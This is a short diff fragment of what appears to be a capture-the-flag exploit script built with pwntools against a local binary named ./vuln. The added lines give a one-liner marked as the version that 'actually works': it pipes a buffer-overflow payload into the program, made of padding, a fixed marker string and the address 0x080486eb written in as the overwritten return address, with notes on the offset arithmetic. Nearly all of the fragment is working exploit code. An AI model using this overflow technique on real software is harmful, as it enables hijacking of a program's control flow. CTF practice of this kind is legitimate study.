@@ -23,7 +23,10 @@ if REMOTE:
     '''
         payload = b"python -c \"" + b"print'56\\n' + 'A'*32 + '<zO%" + b"b"*16 + p32(0x080486eb)+b"'\" | ./vuln"
 
+this one actually works
+python -c 'print "56\n" + "A"*32+"<zO%" + "B"*16 + "\xeb\x86\x04\x08"' | ./vuln
     36+12+4=52
+
     080486eb
     sh.sendline(payload)
     print(sh.recvline())
